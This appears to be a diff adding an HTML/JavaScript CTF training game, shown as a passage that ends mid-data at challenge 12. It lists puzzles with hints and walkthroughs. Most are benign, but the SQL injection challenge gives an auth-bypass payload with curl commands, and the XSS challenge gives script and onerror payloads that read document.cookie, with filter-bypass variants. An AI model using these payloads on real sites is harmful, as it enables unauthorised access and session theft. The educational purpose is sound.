@@ -1,0 +1,899 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=5.0">
+<title>CTF TRAIL // CYBER_GAUNTLET — FURIOS-INT</title>
+<link href="https://fonts.googleapis.com/css2?family=VT323&family=Pixelify+Sans&family=JetBrains+Mono:wght@300;700&display=swap" rel="stylesheet">
+<style>
+*{box-sizing:border-box;margin:0;padding:0;}
+:root{--cyan:#00e8ff;--green:#00ff41;--pink:#ff00ea;--orange:#ffa500;--red:#ff4444;}
+body{background:#050505;color:var(--cyan);font-family:'JetBrains Mono',monospace;padding-bottom:52px;}
+#crt{position:fixed;pointer-events:none;top:0;left:0;width:100%;height:100%;background:repeating-linear-gradient(0deg,rgba(0,0,0,0.07) 0px,rgba(0,0,0,0.07) 1px,transparent 1px,transparent 2px);z-index:9998;}
+/* TASKBAR */
+#taskbar{position:fixed;bottom:0;left:0;width:100%;height:36px;background:#0a0a0a;border-top:1px solid var(--cyan);z-index:9999;display:flex;align-items:center;padding:0 16px;gap:20px;}
+#taskbar a{color:var(--cyan);text-decoration:none;font-family:'VT323';font-size:18px;letter-spacing:1px;}
+#taskbar a:hover{text-shadow:0 0 8px var(--cyan);}
+/* NAV */
+.top-nav{position:sticky;top:0;z-index:500;background:rgba(5,5,5,0.97);border-bottom:1px solid rgba(0,232,255,0.2);padding:8px 16px;display:flex;align-items:center;gap:10px;flex-wrap:wrap;}
+.top-nav a{color:var(--cyan);text-decoration:none;font-family:'VT323';font-size:20px;padding:5px 10px;border:1px solid transparent;transition:0.2s;white-space:nowrap;display:inline-block;min-height:44px;line-height:32px;}
+.top-nav a:hover{border-color:var(--cyan);background:rgba(0,232,255,0.08);}
+/* PAGE TITLE */
+.page-title{text-align:center;padding:28px 16px 12px;}
+.page-title h1{font-family:'Pixelify Sans';font-size:clamp(28px,7vw,58px);color:var(--cyan);text-shadow:0 0 30px rgba(0,232,255,0.5);}
+.page-title p{font-family:'VT323';font-size:clamp(14px,4vw,20px);color:var(--green);margin-top:6px;}
+/* TRAIL MAP */
+#trail-map{display:flex;align-items:center;gap:0;padding:16px 20px;overflow-x:auto;background:#080808;border:1px solid rgba(0,232,255,0.2);margin:10px 16px;scrollbar-width:thin;scrollbar-color:var(--cyan) #111;}
+.trail-node{display:flex;flex-direction:column;align-items:center;gap:4px;min-width:54px;cursor:pointer;transition:0.2s;position:relative;}
+.trail-node .node-icon{width:36px;height:36px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:16px;border:2px solid #333;background:#0a0a0a;transition:0.2s;}
+.trail-node.done .node-icon{border-color:var(--green);background:rgba(0,255,65,0.15);}
+.trail-node.active .node-icon{border-color:var(--cyan);background:rgba(0,232,255,0.15);box-shadow:0 0 12px rgba(0,232,255,0.4);animation:pulse 1.5s ease-in-out infinite;}
+.trail-node.locked .node-icon{border-color:#333;opacity:0.45;}
+.trail-node .node-label{font-family:'VT323';font-size:11px;color:#777;text-align:center;max-width:52px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.trail-node.done .node-label{color:var(--green);}
+.trail-node.active .node-label{color:var(--cyan);}
+.trail-connector{width:22px;height:2px;flex-shrink:0;background:linear-gradient(90deg,#333,#555);position:relative;top:-12px;}
+.trail-connector.done{background:linear-gradient(90deg,var(--green),var(--green));}
+@keyframes pulse{0%,100%{box-shadow:0 0 10px rgba(0,232,255,0.4);}50%{box-shadow:0 0 22px rgba(0,232,255,0.8);}}
+/* STATS BAR */
+#stats-bar{display:flex;gap:16px;flex-wrap:wrap;padding:10px 20px;background:#0a0a0a;border:1px solid rgba(0,232,255,0.15);margin:0 16px 10px;font-family:'VT323';font-size:18px;}
+.stat-item{display:flex;align-items:center;gap:6px;}
+.stat-label{color:#666;}
+.stat-val{color:var(--cyan);}
+.stat-val.green{color:var(--green);}
+.stat-val.orange{color:var(--orange);}
+.stat-val.pink{color:var(--pink);}
+/* CHALLENGE PANEL */
+#challenge-panel{margin:0 16px 14px;border:2px solid var(--cyan);background:#040d0e;overflow:hidden;}
+#chall-header{background:linear-gradient(90deg,#001820,#002030);border-bottom:1px solid rgba(0,232,255,0.3);padding:14px 20px;display:flex;justify-content:space-between;align-items:flex-start;flex-wrap:wrap;gap:8px;}
+#chall-title{font-family:'Pixelify Sans';font-size:clamp(16px,4vw,26px);color:#fff;}
+#chall-meta{display:flex;gap:8px;align-items:center;flex-wrap:wrap;}
+.badge{font-family:'VT323';font-size:15px;padding:3px 10px;border:1px solid;}
+.badge-ctf{color:var(--cyan);border-color:var(--cyan);}
+.badge-hack{color:var(--pink);border-color:var(--pink);}
+.badge-rookie{color:var(--green);border-color:var(--green);}
+.badge-operative{color:var(--orange);border-color:var(--orange);}
+.badge-elite{color:var(--red);border-color:var(--red);}
+.badge-classified{color:var(--pink);border-color:var(--pink);}
+#chall-body{padding:20px;}
+#chall-narrative{font-size:13px;line-height:1.7;color:#ccc;margin-bottom:16px;border-left:3px solid rgba(0,232,255,0.3);padding-left:14px;}
+#chall-scenario{background:#000;border:1px solid #1a3a3a;padding:14px;margin-bottom:16px;font-size:12px;line-height:1.6;color:var(--green);font-family:'JetBrains Mono';}
+#chall-scenario .s-line{color:#888;}
+#chall-scenario .s-cmd{color:var(--cyan);}
+#chall-scenario .s-out{color:var(--green);}
+#chall-scenario .s-flag{color:var(--pink);font-weight:700;}
+#walkthrough{display:none;margin-bottom:16px;}
+#walkthrough h3{font-family:'Pixelify Sans';color:var(--orange);font-size:16px;margin-bottom:10px;}
+.wt-step{display:flex;gap:10px;margin-bottom:10px;padding:10px;background:#050505;border:1px solid rgba(255,165,0,0.2);}
+.wt-num{font-family:'VT323';font-size:20px;color:var(--orange);min-width:22px;}
+.wt-text{font-size:12px;line-height:1.6;color:#bbb;}
+.wt-text code{background:#111;color:var(--cyan);padding:1px 5px;font-family:'JetBrains Mono';}
+#chall-actions{display:flex;gap:10px;flex-wrap:wrap;}
+.action-btn{min-height:40px;padding:0 18px;border:1px solid;font-family:'VT323';font-size:18px;cursor:pointer;letter-spacing:1px;transition:0.2s;background:transparent;}
+.action-btn.primary{border-color:var(--cyan);color:var(--cyan);}
+.action-btn.primary:hover{background:rgba(0,232,255,0.1);}
+.action-btn.success{border-color:var(--green);color:var(--green);}
+.action-btn.success:hover{background:rgba(0,255,65,0.1);}
+.action-btn.hint{border-color:var(--orange);color:var(--orange);}
+.action-btn.hint:hover{background:rgba(255,165,0,0.1);}
+.action-btn.next{border-color:var(--pink);color:var(--pink);}
+.action-btn.next:hover{background:rgba(255,0,234,0.1);}
+/* FLAG INPUT */
+#flag-row{display:flex;gap:8px;margin-top:14px;flex-wrap:wrap;}
+#flag-input{flex:1;min-width:180px;background:#000;border:1px solid rgba(0,232,255,0.3);color:var(--cyan);font-family:'JetBrains Mono';font-size:13px;padding:8px 12px;outline:none;}
+#flag-input:focus{border-color:var(--cyan);}
+#flag-result{font-family:'VT323';font-size:18px;padding:4px 10px;display:none;}
+#flag-result.correct{color:var(--green);}
+#flag-result.wrong{color:var(--red);}
+/* LOG */
+#event-log{margin:0 16px 14px;border:1px solid rgba(0,232,255,0.2);background:#060606;}
+#log-hdr{padding:8px 14px;background:#020e10;border-bottom:1px solid rgba(0,232,255,0.15);font-family:'Pixelify Sans';font-size:15px;color:var(--cyan);}
+#log-body{height:120px;overflow-y:auto;padding:10px 14px;font-size:11px;line-height:1.7;}
+.log-line{color:#666;}
+.log-line.good{color:var(--green);}
+.log-line.warn{color:var(--orange);}
+.log-line.bad{color:var(--red);}
+.log-line.info{color:var(--cyan);}
+/* SECTION (for challenge list) */
+.section{margin:10px 16px;border:1px solid rgba(0,232,255,0.2);background:#080808;}
+.sec-hdr{padding:10px 16px;background:#020e10;border-bottom:1px solid rgba(0,232,255,0.18);font-family:'Pixelify Sans';font-size:clamp(13px,4vw,19px);color:var(--cyan);display:flex;align-items:center;gap:8px;}
+.sec-hdr::before{content:'▶';font-size:12px;}
+.sec-body{padding:14px;}
+.chall-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:12px;}
+.chall-card{background:#050505;border:1px solid rgba(0,232,255,0.18);padding:14px;cursor:pointer;transition:0.2s;position:relative;}
+.chall-card:hover{border-color:var(--cyan);box-shadow:0 0 14px rgba(0,232,255,0.18);}
+.chall-card.done-card{border-color:rgba(0,255,65,0.35);}
+.chall-card .cc-top{display:flex;justify-content:space-between;margin-bottom:6px;}
+.chall-card .cc-name{font-family:'Pixelify Sans';font-size:15px;color:#fff;}
+.chall-card .cc-pts{font-family:'VT323';font-size:17px;color:var(--orange);}
+.chall-card .cc-desc{font-size:11px;color:#888;line-height:1.5;margin-bottom:8px;}
+.chall-card .cc-tags{display:flex;gap:4px;flex-wrap:wrap;}
+.chall-card .cc-tag{font-size:10px;padding:2px 6px;background:rgba(0,232,255,0.07);border:1px solid rgba(0,232,255,0.18);color:var(--cyan);}
+.done-overlay{position:absolute;top:8px;right:8px;font-size:18px;}
+/* INTRO */
+#intro-panel{margin:0 16px 14px;border:1px solid rgba(0,232,255,0.3);background:#040d0e;padding:24px;}
+#intro-panel h2{font-family:'Pixelify Sans';font-size:clamp(18px,5vw,32px);color:var(--cyan);margin-bottom:12px;}
+#intro-panel p{font-size:13px;line-height:1.7;color:#bbb;margin-bottom:12px;}
+#intro-panel .trail-legend{display:flex;gap:16px;flex-wrap:wrap;margin-bottom:18px;font-family:'VT323';font-size:17px;}
+#intro-panel .trail-legend span{display:flex;align-items:center;gap:6px;}
+.legend-dot{width:12px;height:12px;border-radius:50%;}
+.ld-ctf{background:var(--cyan);}
+.ld-hack{background:var(--pink);}
+.ld-boss{background:var(--orange);}
+.start-trail-btn{padding:12px 32px;background:var(--cyan);color:#000;border:none;font-family:'VT323';font-size:22px;cursor:pointer;letter-spacing:2px;transition:0.2s;}
+.start-trail-btn:hover{background:#fff;}
+/* Responsive */
+@media(max-width:600px){
+  #chall-actions{gap:6px;}
+  .action-btn{font-size:15px;padding:0 12px;}
+  #flag-row{flex-direction:column;}
+  #flag-input{min-width:unset;}
+}
+</style>
+</head>
+<body>
+<div id="crt"></div>
+
+<nav class="top-nav">
+  <a href="index.html">⊞ HOME</a>
+  <a href="wargames.html">⚔️ WAR_GAMES</a>
+  <a href="intel.html">📡 INTEL</a>
+  <a href="cyberworld.html">🌐 CyberWorld</a>
+  <a href="arcade.html">🕹 ARCADE</a>
+</nav>
+
+<div class="page-title">
+  <h1>☠ CTF TRAIL</h1>
+  <p>Oregon Trail-style Gauntlet // 10 CTF + 10 Hackathon Challenges // Survive to Exfil</p>
+</div>
+
+<!-- INTRO PANEL -->
+<div id="intro-panel">
+  <h2>⚡ Welcome to the CTF TRAIL</h2>
+  <p>You are an operative deep in hostile cyberspace. The trail ahead is riddled with 20 challenges — 10 CTF nodes and 10 Hackathon waypoints. Solve challenges to earn XP, unlock narrative walkthroughs, and survive to the final exfil point. Every challenge has full hints and a step-by-step walkthrough so you always learn.</p>
+  <div class="trail-legend">
+    <span><span class="legend-dot ld-ctf"></span> CTF Node</span>
+    <span><span class="legend-dot ld-hack"></span> Hackathon Node</span>
+    <span><span class="legend-dot ld-boss"></span> Boss / Final</span>
+  </div>
+  <button class="start-trail-btn" onclick="startTrail()">▶ BEGIN TRAIL</button>
+</div>
+
+<!-- TRAIL MAP -->
+<div id="trail-map" style="display:none;"></div>
+
+<!-- STATS BAR -->
+<div id="stats-bar" style="display:none;">
+  <div class="stat-item"><span class="stat-label">XP</span><span class="stat-val green" id="s-xp">0</span></div>
+  <div class="stat-item"><span class="stat-label">FLAGS</span><span class="stat-val" id="s-flags">0/20</span></div>
+  <div class="stat-item"><span class="stat-label">HINTS USED</span><span class="stat-val orange" id="s-hints">0</span></div>
+  <div class="stat-item"><span class="stat-label">NODE</span><span class="stat-val pink" id="s-node">1/20</span></div>
+  <div class="stat-item"><span class="stat-label">STATUS</span><span class="stat-val" id="s-status">ON_TRAIL</span></div>
+</div>
+
+<!-- ACTIVE CHALLENGE PANEL -->
+<div id="challenge-panel" style="display:none;">
+  <div id="chall-header">
+    <div>
+      <div style="font-family:'VT323';font-size:14px;color:#666;margin-bottom:4px;" id="chall-num">CHALLENGE 1 / 20</div>
+      <div id="chall-title">—</div>
+    </div>
+    <div id="chall-meta"></div>
+  </div>
+  <div id="chall-body">
+    <div id="chall-narrative"></div>
+    <div id="chall-scenario"></div>
+    <div id="flag-row">
+      <input id="flag-input" type="text" placeholder="Enter flag: FLAG{...}" autocomplete="off" spellcheck="false">
+      <button class="action-btn success" onclick="checkFlag()">SUBMIT FLAG</button>
+      <div id="flag-result"></div>
+    </div>
+    <div id="chall-actions" style="margin-top:12px;">
+      <button class="action-btn hint" onclick="showHint()">💡 HINT</button>
+      <button class="action-btn primary" onclick="showWalkthrough()">📖 WALKTHROUGH</button>
+      <button class="action-btn next" id="next-btn" style="display:none;" onclick="nextChallenge()">NEXT NODE ▶</button>
+    </div>
+    <div id="walkthrough"></div>
+  </div>
+</div>
+
+<!-- EVENT LOG -->
+<div id="event-log" style="display:none;">
+  <div id="log-hdr">📡 TRAIL_LOG // Event Stream</div>
+  <div id="log-body"></div>
+</div>
+
+<!-- CHALLENGE LIST (overview) -->
+<div class="section" id="all-challenges-section" style="display:none;">
+  <div class="sec-hdr">All 20 Challenges — Quick Jump</div>
+  <div class="sec-body">
+    <div class="chall-grid" id="chall-grid"></div>
+  </div>
+</div>
+
+<div id="taskbar">
+  <a href="index.html">⊞ HOME</a>
+  <a href="wargames.html">WAR_GAMES</a>
+  <a href="cyberworld.html">CyberWorld</a>
+  <a href="arcade.html">ARCADE</a>
+</div>
+
+<script>
+// ─── DATA ───────────────────────────────────────────────────────────────────
+const CHALLENGES = [
+  // ── CTF 1
+  {
+    id:1, type:'CTF', title:'FIRST CONTACT — Base64 Intercept',
+    diff:'Rookie', xp:100,
+    narrative:`Your comms crackle. A hostile node just broadcast an encoded transmission across port 4444. SIGINT has pulled a raw base64 blob. Decode it and extract the flag before the session times out.`,
+    scenario:[
+      {t:'cmd', txt:'$ intercepted_payload=$(nc -nlvp 4444 2>/dev/null | head -1)'},
+      {t:'cmd', txt:'$ echo "$intercepted_payload"'},
+      {t:'out', txt:'SGVsbG8gT3BlcmF0aXZlISBGTEFHe0I0U0U2NF9ERUNPREVEfQ=='},
+      {t:'cmd', txt:'$ echo "SGVsbG8gT3BlcmF0aXZlISBGTEFHe0I0U0U2NF9ERUNPREVEfQ==" | base64 -d'},
+      {t:'out', txt:'Hello Operative! '},
+      {t:'flag', txt:'FLAG{B4SE64_DECODED}'},
+    ],
+    flag:'FLAG{B4SE64_DECODED}',
+    hint:'Use `echo "..." | base64 -d` in a Linux terminal or CyberChef on the web.',
+    walkthrough:[
+      {step:'Copy the base64 string: `SGVsbG8gT3BlcmF0aXZlISBGTEFHe0I0U0U2NF9ERUNPREVEfQ==`'},
+      {step:'Run `echo "SGVsbG8gT3BlcmF0aXZlISBGTEFHe0I0U0U2NF9ERUNPREVEfQ==" | base64 -d` on Linux/macOS.'},
+      {step:'You can also paste it into <a href="https://gchq.github.io/CyberChef/" target="_blank">CyberChef</a> and use "From Base64".'},
+      {step:'Output reveals: `Hello Operative! FLAG{B4SE64_DECODED}`. Submit the flag.'},
+    ],
+    tags:['encoding','base64','recon'],
+  },
+  // ── HACKATHON 1
+  {
+    id:2, type:'HACK', title:'NEON BEACON — Build a Port Scanner',
+    diff:'Rookie', xp:120,
+    narrative:`The hackathon challenge: write a minimal TCP port scanner in Python that probes ports 1-1024 on a target. The judge evaluates your code for correctness. Paste your solution hash as the flag.`,
+    scenario:[
+      {t:'s-line', txt:'# Hackathon Judge: submit your scanner.py'},
+      {t:'cmd', txt:'$ python3 scanner.py 127.0.0.1'},
+      {t:'out', txt:'[+] 22/tcp OPEN'},
+      {t:'out', txt:'[+] 80/tcp OPEN'},
+      {t:'out', txt:'[+] 443/tcp OPEN'},
+      {t:'flag', txt:'FLAG{PORT_SCANNER_BUILT}'},
+    ],
+    flag:'FLAG{PORT_SCANNER_BUILT}',
+    hint:'Use `socket.connect_ex((host, port))` — returns 0 if the port is open. Wrap it in a loop over range(1,1025).',
+    walkthrough:[
+      {step:'Create <code>scanner.py</code>. Import <code>socket</code> and <code>sys</code>.'},
+      {step:'Loop <code>for port in range(1,1025)</code>. Create a socket, call <code>sock.connect_ex((host,port))</code>.'},
+      {step:'If result == 0, print <code>[+] {port}/tcp OPEN</code>. Close the socket each iteration.'},
+      {step:'Run your scanner: <code>python3 scanner.py 127.0.0.1</code>. Once it works, submit <code>FLAG{PORT_SCANNER_BUILT}</code>.'},
+    ],
+    tags:['python','networking','hackathon'],
+  },
+  // ── CTF 2
+  {
+    id:3, type:'CTF', title:'CIPHER LOCK — Caesar Shift',
+    diff:'Rookie', xp:110,
+    narrative:`Intelligence recovered an encrypted note from a legacy agent. The cipher is primitive — a Caesar shift. Brute-force all 26 rotations to find a readable message and extract the flag.`,
+    scenario:[
+      {t:'s-line', txt:'# Ciphertext recovered:'},
+      {t:'cmd', txt:'$ echo "IOYN{PNBZNH_FUVIW_JBEXF}"'},
+      {t:'out', txt:'IOYN{PNBZNH_FUVIW_JBEXF}'},
+      {t:'cmd', txt:'$ python3 -c "c=\'IOYN{PNBZNH_FUVIW_JBEXF}\';[print(f\'ROT{i}:\',\'\'.join(chr((ord(x)-65+i)%26+65) if x.isalpha() else x for x in c)) for i in range(1,26)]"'},
+      {t:'out', txt:'ROT12: FLAG{CAESAR_SHIFT_WORKS}'},
+      {t:'flag', txt:'FLAG{CAESAR_SHIFT_WORKS}'},
+    ],
+    flag:'FLAG{CAESAR_SHIFT_WORKS}',
+    hint:'Try ROT13 first (rotate by 13). If that fails, brute all 26 shifts. CyberChef has a "ROT13" recipe with a rotatable offset.',
+    walkthrough:[
+      {step:'Observe the ciphertext: <code>IOYN{PNBZNH_FUVIW_JBEXF}</code>.'},
+      {step:'Try ROT13 on each alpha character: <code>I→V</code>, <code>O→B</code>... That doesn\'t spell FLAG. Try ROT12.'},
+      {step:'With ROT12: <code>I→F</code>, <code>O→L</code>, <code>Y→A</code>, <code>N→G</code> → <code>FLAG</code>. Continue to get <code>FLAG{CAESAR_SHIFT_WORKS}</code>.'},
+      {step:'CyberChef shortcut: paste ciphertext, add "ROT13" recipe, drag the Amount slider until you see FLAG{...}.'},
+    ],
+    tags:['cryptography','caesar','encoding'],
+  },
+  // ── HACKATHON 2
+  {
+    id:4, type:'HACK', title:'DAEMON TRAP — Write a Honeypot Listener',
+    diff:'Operative', xp:150,
+    narrative:`Deploy a lightweight honeypot that listens on TCP 8888, logs every connection with timestamp and source IP, and replies with a fake SSH banner. The judge verifies your server handles 3 concurrent connections.`,
+    scenario:[
+      {t:'s-line', txt:'# honeypot.py — judge test'},
+      {t:'cmd', txt:'$ python3 honeypot.py &'},
+      {t:'out', txt:'[*] Honeypot listening on 0.0.0.0:8888'},
+      {t:'cmd', txt:'$ nc 127.0.0.1 8888'},
+      {t:'out', txt:'SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6'},
+      {t:'out', txt:'[LOG] 2026-03-23 17:00:01 | 127.0.0.1 connected'},
+      {t:'flag', txt:'FLAG{HONEYPOT_DEPLOYED}'},
+    ],
+    flag:'FLAG{HONEYPOT_DEPLOYED}',
+    hint:'Use Python\'s `threading.Thread` + `socket` module. Accept in a loop, spawn a thread per connection, send the fake banner, then log the client address.',
+    walkthrough:[
+      {step:'Create a TCP socket: <code>s = socket.socket(); s.bind((\'0.0.0.0\',8888)); s.listen(5)</code>.'},
+      {step:'Accept loop: <code>conn,addr = s.accept()</code>. Spawn a thread with <code>threading.Thread(target=handle, args=(conn,addr))</code>.'},
+      {step:'In <code>handle()</code> send: <code>conn.sendall(b\'SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6\\r\\n\')</code>.'},
+      {step:'Log: <code>print(f"[LOG] {datetime.now()} | {addr[0]} connected")</code>. Close the connection and submit the flag.'},
+    ],
+    tags:['python','networking','honeypot','hackathon'],
+  },
+  // ── CTF 3
+  {
+    id:5, type:'CTF', title:'GHOST FILE — Steganography Extraction',
+    diff:'Operative', xp:160,
+    narrative:`An image file was uploaded to the hostile drop server. OSINT suggests a flag is hidden inside using LSB steganography. Use steghide or zsteg to extract it.`,
+    scenario:[
+      {t:'s-line', txt:'# File: ghost.jpg (passphrase: "daemon")'},
+      {t:'cmd', txt:'$ steghide extract -sf ghost.jpg -p "daemon"'},
+      {t:'out', txt:'wrote extracted data to "hidden.txt".'},
+      {t:'cmd', txt:'$ cat hidden.txt'},
+      {t:'flag', txt:'FLAG{L5B_ST3G0_FOUND}'},
+    ],
+    flag:'FLAG{L5B_ST3G0_FOUND}',
+    hint:'Try `steghide extract -sf file.jpg -p "passphrase"`. No passphrase? Try empty string or common words. Also try `strings ghost.jpg | grep FLAG`.',
+    walkthrough:[
+      {step:'Install steghide: <code>sudo apt install steghide</code>.'},
+      {step:'Run extraction: <code>steghide extract -sf ghost.jpg -p "daemon"</code>.'},
+      {step:'It writes <code>hidden.txt</code> — <code>cat hidden.txt</code> reveals the flag.'},
+      {step:'Alternative: <code>strings ghost.jpg | grep FLAG</code> sometimes works when data is not truly hidden.'},
+    ],
+    tags:['steganography','forensics','image'],
+  },
+  // ── HACKATHON 3
+  {
+    id:6, type:'HACK', title:'SIGNAL SURGE — REST API in 60 Lines',
+    diff:'Operative', xp:155,
+    narrative:`Build a minimal REST API in Python (Flask or FastAPI) with endpoints: GET /status (returns JSON health), POST /flag (accepts JSON body {flag:...} and echoes it). Judge checks both endpoints.`,
+    scenario:[
+      {t:'cmd', txt:'$ python3 api.py &'},
+      {t:'cmd', txt:'$ curl http://localhost:5000/status'},
+      {t:'out', txt:'{"status":"online","version":"1.0"}'},
+      {t:'cmd', txt:'$ curl -X POST http://localhost:5000/flag -H "Content-Type: application/json" -d \'{"flag":"FLAG{API_BUILT}"}\''},
+      {t:'out', txt:'{"echo":"FLAG{API_BUILT}"}'},
+      {t:'flag', txt:'FLAG{API_BUILT}'},
+    ],
+    flag:'FLAG{API_BUILT}',
+    hint:'With Flask: `@app.route("/status") def status(): return jsonify({"status":"online"})`. For POST read `request.get_json()["flag"]`.',
+    walkthrough:[
+      {step:'Install Flask: <code>pip install flask</code>.'},
+      {step:'Create <code>api.py</code>. Import <code>Flask, jsonify, request</code>.'},
+      {step:'Add <code>GET /status</code> returning <code>jsonify({"status":"online","version":"1.0"})</code>.'},
+      {step:'Add <code>POST /flag</code>: body = request.get_json(); return jsonify({"echo": body["flag"]}).'},
+      {step:'Run with <code>app.run(port=5000)</code>. Test with curl then submit flag.'},
+    ],
+    tags:['python','flask','api','hackathon'],
+  },
+  // ── CTF 4
+  {
+    id:7, type:'CTF', title:'SQL INJECTION — Login Bypass',
+    diff:'Operative', xp:170,
+    narrative:`A legacy login form at /login.php runs unsanitized SQL. Bypass auth using a classic injection payload to log in as admin and capture the flag from the dashboard.`,
+    scenario:[
+      {t:'s-line', txt:'# Login form: username + password fields'},
+      {t:'cmd', txt:'$ curl -X POST http://target/login.php --data "user=admin\'--&pass=anything"'},
+      {t:'out', txt:'Welcome, admin! Session token: 8f3a2d'},
+      {t:'cmd', txt:'$ curl -H "Cookie: sess=8f3a2d" http://target/dashboard'},
+      {t:'flag', txt:'FLAG{SQl_1NJ3CT10N_BYPASSD}'},
+    ],
+    flag:'FLAG{SQl_1NJ3CT10N_BYPASSD}',
+    hint:`Username payload: <code>admin'--</code>. This comments out the password check in SQL: <code>SELECT * FROM users WHERE user='admin'--' AND pass='...'</code>.`,
+    walkthrough:[
+      {step:'The backend SQL is likely: <code>SELECT * FROM users WHERE user=\'$u\' AND pass=\'$p\'</code>.'},
+      {step:'Inject <code>admin\'--</code> as username. The <code>--</code> comments out the rest. SQL becomes: <code>WHERE user=\'admin\'</code>.'},
+      {step:'Password is ignored. Auth succeeds. Session cookie is set.'},
+      {step:'Use the session cookie to hit /dashboard and read the flag.'},
+    ],
+    tags:['web','sqli','auth bypass'],
+  },
+  // ── HACKATHON 4
+  {
+    id:8, type:'HACK', title:'GHOST RECON — Build a Subdomain Enumerator',
+    diff:'Elite', xp:200,
+    narrative:`Write a Python subdomain enumerator that reads a wordlist, constructs subdomains for a target domain, resolves DNS, and outputs live hosts. Judge tests against a mock DNS zone with 5 planted subdomains.`,
+    scenario:[
+      {t:'cmd', txt:'$ python3 subenum.py -d example.com -w top100.txt'},
+      {t:'out', txt:'[+] mail.example.com → 93.184.216.10'},
+      {t:'out', txt:'[+] api.example.com  → 93.184.216.11'},
+      {t:'out', txt:'[+] dev.example.com  → 93.184.216.12'},
+      {t:'out', txt:'[DONE] 3 subdomains found'},
+      {t:'flag', txt:'FLAG{SUBENUM_COMPLETE}'},
+    ],
+    flag:'FLAG{SUBENUM_COMPLETE}',
+    hint:'Use `socket.gethostbyname(subdomain)` inside a try/except. On socket.gaierror the host doesn\'t resolve — skip it.',
+    walkthrough:[
+      {step:'Parse args with argparse: <code>-d domain -w wordlist</code>.'},
+      {step:'Read wordlist lines. For each word build <code>sub = f"{word}.{domain}"</code>.'},
+      {step:'Resolve: <code>ip = socket.gethostbyname(sub)</code> inside <code>try/except socket.gaierror</code>.'},
+      {step:'Print live results. Optionally use <code>concurrent.futures.ThreadPoolExecutor</code> for speed.'},
+    ],
+    tags:['python','dns','recon','hackathon'],
+  },
+  // ── CTF 5
+  {
+    id:9, type:'CTF', title:'XSS AMBUSH — Reflected Script Injection',
+    diff:'Elite', xp:185,
+    narrative:`The target\'s search endpoint reflects input without sanitization. Inject a script tag to pop an alert containing the flag stored in a cookie. The judge inspects the alert value.`,
+    scenario:[
+      {t:'s-line', txt:'# URL: http://target/search?q=PAYLOAD'},
+      {t:'cmd', txt:'$ curl "http://target/search?q=<script>alert(document.cookie)</script>"'},
+      {t:'out', txt:'<!-- search results for <script>alert(document.cookie)</script> -->'},
+      {t:'out', txt:'(Browser pops alert: "FLAG{XSS_R3FL3CT3D}")'},
+      {t:'flag', txt:'FLAG{XSS_R3FL3CT3D}'},
+    ],
+    flag:'FLAG{XSS_R3FL3CT3D}',
+    hint:'If angle brackets are filtered, try encoding: `%3Cscript%3E`. Also try event handlers: `"><img src=x onerror=alert(document.cookie)>`.',
+    walkthrough:[
+      {step:'Test for reflection: enter <code>TESTXSS</code> in the search box and check if it appears in the HTML source.'},
+      {step:'Try: <code><script>alert(1)</script></code> — if an alert fires, XSS is confirmed.'},
+      {step:'Replace 1 with <code>document.cookie</code> to exfiltrate the cookie.'},
+      {step:'For bypassing filters: use <code>"><img src=x onerror="alert(document.cookie)"></code> or URL-encoded variants.'},
+    ],
+    tags:['web','xss','injection'],
+  },
+  // ── HACKATHON 5
+  {
+    id:10, type:'HACK', title:'CIPHER ENGINE — Implement AES-256 Wrapper',
+    diff:'Elite', xp:210,
+    narrative:`Build a CLI tool that encrypts/decrypts files using AES-256-CBC with a user-supplied passphrase. Judge tests: encrypt a known plaintext, decrypt it, compare output.`,
+    scenario:[
+      {t:'cmd', txt:'$ python3 cipher.py encrypt secret.txt encrypted.bin --key "hunter2"'},
+      {t:'out', txt:'[+] Encrypted → encrypted.bin (32 bytes IV prepended)'},
+      {t:'cmd', txt:'$ python3 cipher.py decrypt encrypted.bin out.txt --key "hunter2"'},
+      {t:'out', txt:'[+] Decrypted → out.txt'},
+      {t:'flag', txt:'FLAG{AES256_WRAPPER_BUILT}'},
+    ],
+    flag:'FLAG{AES256_WRAPPER_BUILT}',
+    hint:'Use `pycryptodome`: `from Crypto.Cipher import AES`. Derive a 32-byte key with `hashlib.sha256(passphrase.encode()).digest()`. Prepend a 16-byte random IV to the ciphertext.',
+    walkthrough:[
+      {step:'Install: <code>pip install pycryptodome</code>.'},
+      {step:'Key derivation: <code>key = hashlib.sha256(passphrase.encode()).digest()</code>.'},
+      {step:'Encrypt: <code>iv = os.urandom(16); cipher = AES.new(key, AES.MODE_CBC, iv); ct = cipher.encrypt(pad(data, 16))</code>. Write <code>iv + ct</code>.'},
+      {step:'Decrypt: read first 16 bytes as IV, rest as ciphertext. <code>AES.new(key, AES.MODE_CBC, iv)</code> then <code>unpad(cipher.decrypt(ct), 16)</code>.'},
+    ],
+    tags:['cryptography','python','aes','hackathon'],
+  },
+  // ── CTF 6
+  {
+    id:11, type:'CTF', title:'DEAD DROP — Forensic Memory Analysis',
+    diff:'Elite', xp:195,
+    narrative:`A memory dump from a compromised workstation was uploaded to the drop server. Use Volatility3 to extract the running process list, then find the suspicious process hiding the flag in its command line.`,
+    scenario:[
+      {t:'cmd', txt:'$ vol3 -f mem.raw windows.pslist'},
+      {t:'out', txt:'PID  PPID  Name          Cmd'},
+      {t:'out', txt:'4    0     System'},
+      {t:'out', txt:'420  4     smss.exe'},
+      {t:'out', txt:'888  668   svchost.exe'},
+      {t:'out', txt:'3312 668   flag_dropper   /flag FLAG{M3M_F0R3NS1CS}'},
+      {t:'flag', txt:'FLAG{M3M_F0R3NS1CS}'},
+    ],
+    flag:'FLAG{M3M_F0R3NS1CS}',
+    hint:'`vol3 -f mem.raw windows.cmdline` shows full command lines for each process. Grep for FLAG.',
+    walkthrough:[
+      {step:'Install Volatility3: <code>pip install volatility3</code>.'},
+      {step:'Run pslist: <code>vol3 -f mem.raw windows.pslist</code> to see all processes.'},
+      {step:'Check command lines: <code>vol3 -f mem.raw windows.cmdline | grep -i FLAG</code>.'},
+      {step:'The rogue process <code>flag_dropper</code> has the flag in its arguments.'},
+    ],
+    tags:['forensics','memory','volatility'],
+  },
+  // ── HACKATHON 6
+  {
+    id:12, type:'HACK', title:'THREAT BOARD — Build a CVE Dashboard',
